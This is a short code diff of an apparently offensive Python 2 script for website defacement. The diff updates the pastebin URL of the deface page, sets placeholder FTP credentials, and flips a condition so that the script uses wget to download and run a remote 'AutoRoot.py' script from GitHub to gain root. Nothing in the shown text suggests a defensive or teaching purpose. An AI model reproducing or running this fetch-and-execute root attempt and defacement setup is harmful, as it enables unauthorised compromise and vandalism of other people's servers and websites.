@@ -22,20 +22,20 @@ import urllib2
 # # # C O N F I G # # #
 #######################
 #
-deface_page = "https://pastebin.com/raw/VJdWKgCp"
+deface_page = "https://pastebin.com/raw/vbHUAy9n"
 #
 #FTP
 ftp_host = "127.0.0.1"
 ftp_user = "username"
 ftp_password = "password"
 #
-got_root = "Y"  #if n then will try to exploit and gain root!
+got_root = "Y"  #if N then will try to exploit and gain root!
 #
 ###############################
 # # # E N D - C O N F I G # # #
 ###############################
 
-if got_root == "Y":
+if got_root == "N":
     print "Attempting to root!"
     os.system('wget https://raw.githubusercontent.com/Eitenne/Public/master/AutoRoot.py; python AutoRoot.py')
 else:
